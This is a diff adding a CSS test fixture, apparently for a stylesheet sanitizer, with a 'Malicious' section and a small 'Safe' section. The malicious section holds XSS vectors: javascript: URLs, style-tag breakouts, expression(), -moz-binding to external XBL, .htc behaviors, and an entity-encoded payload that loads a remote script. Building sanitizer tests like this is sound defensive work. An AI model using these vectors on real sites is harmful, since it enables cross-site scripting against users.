@@ -1,0 +1,91 @@
+/*
+ * Malicious
+ */
+
+/* Charset */
+@charset 'iso-8859-15';
+
+/* Imports */
+@import url("test1.css");
+@import url ("test2.css");
+@import "test3.css";
+@import test4.css;
+@import "test5.css" tv, print;
+@import test6.css, print;
+@import http://example.com/test7.css;
+@import "http://example.com/test8.css";
+@import url("/test9.css");
+@import url('test10.css') screen and (orientation:landscape);
+
+
+/* Javascript */
+body {
+	background: url( javascript:alert( '1' ) );
+}
+
+header {
+	background-image: url( 'http://example.com/foo.jpg?</STYLE><SCRIPT>alert(2)</SCRIPT>' );
+}
+
+article {
+	background-image: url( 'http://example.com/foo.jpg?</STYLE><SCRIPT>alert(3)</SCRIPT>' );
+}
+
+footer {
+	width: expression( alert( '4' ) );
+}
+
+div {
+	background-image: url( 'javascript:alert(5);' );
+}
+
+p {
+	background: url( "javascript:alert(6);" );
+}
+
+span {
+	list-style-image: url( javascript:alert( 7 ) );
+}
+
+* {
+	background:url("javascript:alert(8);");
+}
+
+/* Bindings */
+body {
+	binding: url("/test.xml");
+}
+
+h2 {
+	-webkit-binding: url("//example.com/test2.xml");
+}
+
+h3 {
+	-moz-binding: url("test3.xml");
+}
+
+div {
+	\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss);
+	&#x78&#x78&#x3A&#x20&#x65&#x5C&#x78&#x70&#x5C&#x72&#x65&#x5C&#x73&#x5C&#x73&#x5C&#x69&#x5C&#x6F&#x5C&#x6E&#x28&#x28&#x77&#x69&#x6E&#x64&#x6F&#x77&#x2E&#x72&#x21&#x3D&#x31&#x29&#x20&#x3F&#x20&#x65&#x76&#x61&#x6C&#x28&#x27&#x78&#x3D&#x53&#x74&#x72&#x69&#x6E&#x67&#x2E&#x66&#x72&#x6F&#x6D&#x43&#x68&#x61&#x72&#x43&#x6F&#x64&#x65&#x3B&#x73&#x63&#x72&#x3D&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x63&#x72&#x65&#x61&#x74&#x65&#x45&#x6C&#x65&#x6D&#x65&#x6E&#x74&#x28&#x78&#x28&#x31&#x31&#x35&#x2C&#x39&#x39&#x2C&#x31&#x31&#x34&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x32&#x2C&#x31&#x31&#x36&#x29&#x29&#x3B&#x73&#x63&#x72&#x2E&#x73&#x65&#x74&#x41&#x74&#x74&#x72&#x69&#x62&#x75&#x74&#x65&#x28&#x78&#x28&#x31&#x31&#x35&#x2C&#x31&#x31&#x34&#x2C&#x39&#x39&#x29&#x2C&#x78&#x28&#x31&#x30&#x34&#x2C&#x31&#x31&#x36&#x2C&#x31&#x31&#x36&#x2C&#x31&#x31&#x32&#x2C&#x35&#x38&#x2C&#x34&#x37&#x2C&#x34&#x37&#x2C&#x39&#x38&#x2C&#x31&#x31&#x37&#x2C&#x31&#x31&#x35&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x31&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x32&#x2C&#x31&#x31&#x31&#x2C&#x34&#x36&#x2C&#x39&#x39&#x2C&#x31&#x31&#x31&#x2C&#x34&#x36&#x2C&#x31&#x31&#x37&#x2C&#x31&#x30&#x37&#x2C&#x34&#x37&#x2C&#x31&#x30&#x38&#x2C&#x39&#x37&#x2C&#x39&#x38&#x2C&#x31&#x31&#x35&#x2C&#x34&#x37&#x2C&#x31&#x32&#x30&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x34&#x37&#x2C&#x31&#x32&#x30&#x2C&#x31&#x31&#x35&#x2C&#x31&#x31&#x35&#x2C&#x34&#x36&#x2C&#x31&#x30&#x36&#x2C&#x31&#x31&#x35&#x29&#x29&#x3B&#x64&#x6F&#x63&#x75&#x6D&#x65&#x6E&#x74&#x2E&#x67&#x65&#x74&#x45&#x6C&#x65&#x6D&#x65&#x6E&#x74&#x42&#x79&#x49&#x64&#x28&#x78&#x28&#x20&#x31&#x30&#x35&#x2C&#x31&#x31&#x30&#x2C&#x31&#x30&#x36&#x2C&#x31&#x30&#x31&#x2C&#x39&#x39&#x2C&#x31&#x31&#x36&#x20&#x29&#x29&#x2E&#x61&#x70&#x70&#x65&#x6E&#x64&#x43&#x68&#x69&#x6C&#x64&#x28&#x73&#x63&#x72&#x29&#x3B&#x77&#x69&#x6E&#x64&#x6F&#x77&#x2E&#x72&#x3D&#x31&#x3B&#x27&#x29 : 1);
+}
+
+/* Misc */
+a {
+	content-before: @url(example.com/evil.xml);
+}
+
+a {
+	behavior: url(a1.htc) url(a2.htc);
+}
+
+/*
+ * Safe
+ */
+
+.sidebar {
+	background-color: #99CBC7;
+}
+
+.hentry {
+	background-color: #7AB7F3;
+}
